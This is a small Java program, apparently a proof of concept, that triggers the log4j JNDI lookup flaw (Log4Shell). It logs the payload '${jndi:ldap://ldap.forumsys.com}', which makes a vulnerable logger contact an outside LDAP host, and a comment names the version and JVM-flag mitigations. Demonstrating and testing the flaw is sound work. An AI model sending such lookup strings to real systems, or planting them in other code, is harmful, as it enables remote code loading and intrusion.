package k.m;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    private static final Logger logger = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        // To avoid instance creation use lib version > 2.14.1 or VM option -Dlog4j2.formatMsgNoLookups=true
        logger.info("bug=" + "${jndi:ldap://ldap.forumsys.com}");
    }
}
